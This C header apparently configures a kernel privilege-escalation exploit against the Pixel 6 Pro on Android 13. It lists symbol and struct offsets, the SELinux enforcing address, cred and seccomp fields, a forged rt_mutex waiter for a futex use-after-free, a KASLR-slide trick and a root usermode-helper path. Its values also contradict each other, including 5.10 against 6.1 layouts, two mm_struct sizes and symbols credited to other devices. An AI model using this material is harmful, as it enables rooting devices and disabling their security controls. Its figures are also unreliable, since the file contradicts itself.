// raven — Pixel 6 Pro, Android 13
// Build: TQ3A.230901.001.C2
// Kernel: 5.10.157-android13-4-00003-g776d0a76f6aa-ab10208116
//
// DERIVED OFFLINE, NEVER RUN ON HARDWARE. Nothing here has been confirmed by
// harvest-live.sh. The bug itself is not in doubt -- this build's own tree
// (kernel/common @ 776d0a76f6aa, from its uname) carries the unfixed
// remove_waiter(), identical to panther's -- but no 5.10 device has run the
// chain, and three route constants below were inherited rather than measured.
// Issue #2.
//
// Provenance, all of it from the build's public OTA and nothing else:
//   Image      partial_boot.py on the raven TQ3A OTA, then boot_image.py.
//              Byte-identical to AOSP prebuilts/boot-artifacts
//              android-13.0.0_r0.123 kernel/Image.lz4 (md5 991aef33...).
//   symbols    kallsyms-finder on that Image; SYMMAP/PTRMAP/CODEMAP rows of
//              runner/scripts/lib/offset-maps.txt, all 27 resolved.
//   structs    the kernel's own BTF, sliced out of that Image between
//              __start_BTF and __stop_BTF -- the same blob a rooted device
//              serves as /sys/kernel/btf/vmlinux (verified byte-identical on
//              panther). STRUCTMAP rows, 55 of 57 resolved.
//   config     the kernel's own .config, which CONFIG_IKCONFIG_PROC links into
//              the image between IKCFG_ST and IKCFG_ED. Confirms FUTEX=y,
//              FUTEX_PI=y, ASHMEM=y, CFI_CLANG=y, and that ZONE_DMA,
//              DEBUG_RT_MUTEXES and SLAB_MERGE_DEFAULT are all unset -- the
//              first two are why KMALLOC_CACHE_TYPES is 2 and why the waiter
//              layout below has no debug fields ahead of prio.
//   slab       NOT measured. MM_STRUCT_SZ is sizeof(mm_struct)=0x3e0 rounded
//              to the 128B SLAB_HWCACHE_ALIGN stride arm64 uses. The rounding
//              is arithmetic and SLAB_MERGE_DEFAULT being off means the cache
//              is its own, but the stride itself is a runtime fact and only
//              /proc/slabinfo measures it. This is the one unmeasured value.
//
// Version facts that are not measurements:
//   rt_mutex_waiter has no wake_state and no ww_ctx before the 5.15/5.16
//   rtmutex rework, so prio sits at 0x40 and the struct ends at 0x50. The
//   FAKE_WAITER_* entries for the two absent fields point past it on purpose;
//   those stores land in the W0_OFF..SCRATCH_OFF gap of our own buffer and are
//   harmless (see the comment in util.c).
//   kmalloc-cg-* arrived in 5.14 (494c1dfe855e), so there is no cgroup row:
//   KMALLOC_CGROUP_TYPE is the normal row and KMALLOC_CACHE_TYPES is 2.
//   configfs was converted to iter ops in 5.13, so CONFIGFS_RW_SLOT_READ=1
//   puts configfs_read_bin_file/configfs_write_bin_file in .read/.write.
//
// Untested policy picks, inherited from the 6.1 raven header, not derived:
//   PSELECT_WAITER_WORD_SHIFT. The vehicle is no longer inherited: it is
//   pselect, which is the only one this kernel version admits.
//
#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "raven-TQ3A.230901.001.C2-app"
#else
#define BUILD_VARIANT_LABEL "raven-TQ3A.230901.001.C2-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/raven/raven:13/TQ3A.230901.001.C2/10750268:user/release-keys"
#endif

// ── Memory map (VA_BITS=39, 4K pages, KASAN_HW_TAGS) ──
// KIMAGE_VADDR = MODULES_END = _PAGE_END(39) + SZ_128M = 0xffffffc008000000
// (verified against vmlinux kimage_vaddr symbol).
// Kernel version as (major<<16)|(minor<<8)|min(patch,255), from the
// `// Kernel:` line above. Declared so a stage can gate on it: a reclaim
// vehicle whose struct only exists from a given release is refused at
// `make check` for a target below it, instead of panicking the device.
#define KERNEL_VERSION_CODE 0x050a9d  // 5.10.157
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
// PAGE_OFFSET = _PAGE_OFFSET(39) = -(1<<39)
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
// DTB memory@80000000: RAM base; kernel Image text_offset=0 loads at RAM base.
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
// VMEMMAP_START = -(1 << (VA_BITS - VMEMMAP_SHIFT)) = -(1<<33)
#define VMEMMAP_START 0xfffffffe00000000ULL

// ── 6.1 kmalloc / mm_struct knobs (common.h defaults are for 6.6) ──
// sizeof(mm_struct) = 0x3c0 (DWARF byte_size), BUT the mm_cachep slab is
// created with SLAB_HWCACHE_ALIGN; arm64 cache lines are 128B
// (CONFIG_L1_CACHE_SHIFT=7), so calculate_alignment() rounds the object
// stride up to 0x400 (1024). KernelSnitch walks mm_struct candidates at
// stride MM_STRUCT_SZ inside each slab, so it must be the REAL slab stride
// (0x400), not the raw sizeof. Without this every candidate is misaligned
// and the futex-hash collision check never matches (observed: deterministic
// "KernelSnitch mm_struct leak failed" on tegu).
#define MM_STRUCT_SZ 0x400
// CONFIG_ZONE_DMA is NOT set → no ZONE_DMA kmalloc row.
// Row order: NORMAL=0, CGROUP=1, RECLAIM=2.
#define KMALLOC_CGROUP_TYPE 0
#define KMALLOC_CACHE_TYPES 2
// pipe_buffer array = 32 * 0x28 = 1280 B → kmalloc-cg-2048 (index 11).
#define KMALLOC_PIPE_INDEX 11

// ── Kernel symbol offsets (extracted from husky/tegu kallsyms, build 14791245) ──
#define ASHMEM_IOCTL_OFF            0x01183338ULL
#define ASHMEM_MMAP_OFF             0x01183fccULL
#define ASHMEM_OPEN_OFF             0x01184360ULL
#define ASHMEM_RELEASE_OFF          0x01184400ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x011845f0ULL
// &ashmem_miscs[0].fops = ashmem_miscs + offsetof(miscdevice, fops=0x10)
#define ASHMEM_MISC_FOPS_OFF        0x030676e0ULL
#define ASHMEM_FOPS_OFF             0x024cfc90ULL
#define ASHMEM_COMPAT_IOCTL_OFF     0x01a36e30ULL

#define CONFIGFS_READ_ITER_OFF      0x0065c6fcULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0065cb98ULL
// 6.1 has no copy_splice_read: configfs uses generic_file_splice_read
// (0x3e5fd4 in this build).
#define COPY_SPLICE_READ_OFF        0x0059e61cULL
#define NOOP_LLSEEK_OFF             0x0052bac0ULL
#define INIT_TASK_OFF               0x0302b0c0ULL
#define ROOT_TASK_GROUP_OFF         0x03142a40ULL
// runtime selinux_enforcing = selinux_state.enforcing = selinux_state + 0
#define SELINUX_ENFORCING_OFF       0x03195958ULL
#define SELINUX_BLOB_SIZES_OFF      0x0251bcc0ULL
#define SECURITY_HOOK_HEADS_OFF     0x02519910ULL
#define KMALLOC_CACHES_OFF          0x0251ca08ULL
#define ANON_PIPE_BUF_OPS_OFF       0x0237aea8ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00160000ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x02f0d5c8ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)

// ── Slide references ──
// nfulnl_logger struct (registered via nf_log_register(NFPROTO_UNSPEC,...)).
#define SLIDE_NFULNL_LOGGER_OFF     0x02f10ec0ULL
// Write-free KASLR (cves/kaslr/README.md): tracing_mark_write _THIS_IP_
// image offset (entry->ip store), derived from the live panther + shipped boot.img.
#define SLIDE_TRACE_MARK_IP_OFF     0x002f8e44ULL
// loggers[0][NF_LOG_TYPE_ULOG=1] = loggers + 8  (holds &nfulnl_logger)
#define SLIDE_LOGGERS_0_1_OFF       0x02f10df0ULL
// 6.1 serves /proc/sys/kernel/random/boot_id from sysctl_bootid[16]
// (drivers/char/random.c: ctl_table .data = &sysctl_bootid). No separate
// random_boot_id exists on 6.1.
//
// The slide write must corrupt random_table[4].data (the .data pointer of
// the boot_id ctl_table entry), NOT sysctl_bootid itself. proc_do_uuid()
// then treats the corrupted pointer as the buffer address and reads 16
// bytes from there (the contents of loggers[0][1] = &nfulnl_logger).
// random_table @ 0x2137c00; entry idx4 (boot_id) * 0x40 + data@0x8 = 0x2137d08.
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x03025038ULL
#define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
// sysctl_bootid buffer itself (restore_slide_boot_id writes &sysctl_bootid
// back into random_table[4].data via SLIDE_SYSCTL_BOOTID).
#define SLIDE_SYSCTL_BOOTID_OFF     0x031aba29ULL
// 6.1 slide uses loggers[0][1] (= SLIDE_LOGGERS_0_1) as the rb parent
// whose content is leaked.
#define SLIDE_LOGGER_PARENT SLIDE_LOGGERS_0_1

// main route: use the tokay-proven TCP transport on 6.1 (tegu), which has
// dedicated payload geometry (MAIN_TCP_PAYLOAD) avoiding the fake_lock
// rb_leftmost misalignment seen with the pselect main route.
// configfs got iter ops in 5.13; this build predates that, so the
// forged fops hands configfs_read_bin_file/configfs_write_bin_file to
// the .read/.write slots instead of the iter pair.
#define CONFIGFS_RW_SLOT_READ 1

// The pselect vehicle, and not by inheritance: tcp-zc reads waiter->task and
// waiter->lock out of struct tcp_zerocopy_receive fields that arrived in 5.14,
// so on this kernel the getsockopt copy is truncated before reaching them. The
// build gate below refuses that pairing outright; this states the choice the
// target can actually run. Page geometry follows from the vehicle.
#define RECLAIM_VEHICLE_DEFAULT 0
// upstream tokay (6.1) slide: word map starts at waiter-word 2 with shift 1
// Derived from this build's own Image by runner/scripts/lib/offset-maps.txt
// [STACKMAP], not inherited: the futex chain frames (0x90 + 0x130 + 0x1a0) put
// the freed waiter at sp+0x90, and the select chain (0xa0 + 0x1d0) puts
// stack_fds at sp+0x60, so the waiter lands 24 words BELOW the fd_set region.
//
// That is outside the placeable window [-2, +5] the word map and
// PSELECT_ROUTE_NFDS imply, which is the same statement as: the pselect vehicle
// cannot reach the waiter on this build. The payload's startup gate refuses the
// shot on that basis rather than arming a race that cannot be won. The value is
// recorded rather than omitted so the refusal names a measured number.
#define PSELECT_WAITER_WORD_SHIFT -26

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

// ── Page layout ──
#define LOCK_OFF        0x1350
#define W0_OFF          0x2220
#define FOPS_OFF        0x1000
#define SCRATCH_OFF     0x3000
#define RIGHT_OFF       0x4440
#define LEFT_OFF        0x5550
#define FAKE_TASK_OFF   0x3200

// ── 6.1 rt_mutex_waiter (FLAT layout, one shared prio/deadline) ──
// tree_entry rb_node        @ 0x00
// pi_tree_entry rb_node     @ 0x18
// task                      @ 0x30
// lock                      @ 0x38
// wake_state (u32)          @ 0x40
// prio (i32)                @ 0x44
// deadline (u64)            @ 0x48
// ww_ctx                    @ 0x50
#define FAKE_WAITER_TREE_PRIO_OFF       0x40
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF            0x30
#define FAKE_WAITER_LOCK_OFF            0x38
#define FAKE_WAITER_WAKE_STATE_OFF      0x50
#define FAKE_WAITER_WW_CTX_OFF          0x58

// ── 6.1 task_struct fake-task fields (DWARF) ──
#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x84
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c
#define FAKE_TASK_TASK_GROUP_OFF    0x310
#define FAKE_TASK_PI_LOCK_OFF       0x86c
#define FAKE_TASK_PI_WAITERS_OFF    0x880
#define FAKE_TASK_PI_TOP_TASK_OFF   0x890
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898

#define CFG_PAGE_OFF             16
#define CFG_NEEDS_READ_FILL_OFF  80
#define CFG_BIN_BUFFER_OFF       88
#define CFG_BIN_BUFFER_SIZE_OFF  96
#define CFG_CB_MAX_SIZE_OFF      100

#define WQ_DFL_PWQ_OFF    0xb0
#define PWQ_POOL_OFF       0x00
#define PWQ_WQ_OFF         0x8
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF     0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF  0x58
#define PWQ_MAX_ACTIVE_OFF 0x5c
#define POOL_WORKLIST_OFF  0x20
#define POOL_NR_IDLE_OFF   0x34

#define WORK_DATA_OFF  0x0
#define WORK_ENTRY_OFF 0x8
#define WORK_FUNC_OFF  0x18

// ── 6.1 task_struct field offsets (DWARF) ──
#define TASK_PID_OFF                  0x5c8
#define TASK_TGID_OFF                 0x5cc
#define TASK_REAL_PARENT_OFF          0x5d8
#define TASK_REAL_CRED_OFF            0x778
#define TASK_CRED_OFF                 0x780
#define TASK_COMM_OFF                 0x790
#define TASK_TASKS_OFF                0x4c8
#define TASK_THREAD_INFO_FLAGS_OFF    0x00
#define TASK_SECCOMP_OFF              0x848
#define TASK_ATOMIC_FLAGS_OFF         0x590

// ── 6.1 cred field offsets (DWARF, no CONFIG_DEBUG_CREDENTIALS) ──
#define CRED_UID_OFF                  0x4
#define CRED_SECUREBITS_OFF           0x24
#define CRED_CAPS_OFF                 0x28
#define CRED_SECURITY_OFF             0x78
#define SELINUX_CRED_BLOB_OFF         0
#define SELINUX_CRED_OSID_OFF         0
#define SELINUX_CRED_SID_OFF          4

#define SECCOMP_MODE_OFF              0x0
#define SECCOMP_FILTER_COUNT_OFF      0x04
#define SECCOMP_FILTER_OFF            0x8
#define TIF_SECCOMP_BIT               11
#define PFA_NO_NEW_PRIVS_BIT          0

#define MM_OWNER_OFF                  0x348
#define PIPE_BUFFER_SIZE              0x28

#define WAITER_LOCAL_OFF              0x80
#define WAITER_TREE_ENTRY_OFF         0x0
#define WAITER_PI_TREE_ENTRY_OFF      0x18
#define WAITER_TASK_OFF               0x30
#define WAITER_LOCK_OFF               0x38
// prio at 0x40, not 0x44: there is no wake_state ahead of it on this kernel.
#define WAITER_PRIO_OFF               0x40
#define WAITER_DEADLINE_OFF           0x48
// WAITER_WAKE_STATE_OFF and WAITER_WW_CTX_OFF are deliberately absent:
// rt_mutex_waiter gained wake_state and ww_ctx in the 5.15/5.16 rtmutex
// rework, so this kernel has neither and no honest value exists for them.
// (Nothing reads this group; it is the record of the layout. The FAKE_WAITER_*
// pair above stays, because util.c stores through it -- those bytes land in
// the W0_OFF..SCRATCH_OFF gap of our own buffer and are harmless.)
// What tells resolve-recipe.py this header is android13-5.10 and not
// android14-6.1 is CONFIGFS_RW_SLOT_READ above, which this flavour cannot
// build without.

#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x8
// 6.1 SLUB uses struct page directly (no struct slab overlay):
// flags@0x00, slab_list(list_head)@0x08, slab_cache@0x18.
#define STRUCT_SLAB_CACHE_OFF         0x18
#define STRUCT_PAGE_TYPE_OFF          0x30

#define PIPE_BUFFER_SLOTS             32
#define PIPE_BUF_FLAG_CAN_MERGE       0x10

// ── 6.1 file_operations (DWARF; 6.1 keeps iterate so these differ from 6.6) ──
#define FOPS_OWNER_OFF          0x0
#define FOPS_LLSEEK_OFF         0x8
#define FOPS_POST_LLSEEK_OFF    0x10
#define FOPS_READ_OFF           0x10
#define FOPS_WRITE_OFF          0x18
#define FOPS_READ_ITER_OFF      0x20
#define FOPS_WRITE_ITER_OFF     0x28
#define FOPS_IOCTL_OFF          0x50
#define FOPS_COMPAT_IOCTL_OFF   0x58
#define FOPS_MMAP_OFF           0x60
#define FOPS_OPEN_OFF           0x70
#define FOPS_RELEASE_OFF        0x80
#define FOPS_SPLICE_READ_OFF    0xc8
#define FOPS_SHOW_FDINFO_OFF    0xe0

// ── su_daemon UMH ──
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#endif
